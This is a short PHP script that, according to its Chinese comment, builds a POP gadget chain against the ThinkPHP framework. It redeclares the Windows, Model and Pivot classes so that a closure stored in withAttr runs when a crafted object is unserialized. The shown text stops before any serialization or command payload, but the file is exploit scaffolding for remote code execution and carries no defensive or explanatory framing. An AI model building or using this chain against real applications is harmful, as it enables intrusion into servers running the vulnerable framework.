<?php
//构造pop所需要的类及变量
namespace think\process\pipes;
require __DIR__ . '/vendor/autoload.php';
class Windows
{
    private $files = [];
    public function __construct($files)
    {
        $this->files=[$files];
    }
}

namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    protected $visible = [];
    private $withAttr = [];
    function __construct($closure){
        $this->data = ["huha"=>''];
        # withAttr中的键值要与data中的键值相等
        $this->withAttr = ['huha'=> $closure ];
    }
}

namespace think\model;
class Pivot extends \think\Model
{
    function __construct($closure){
        parent::__construct($closure);
    }
}
?>

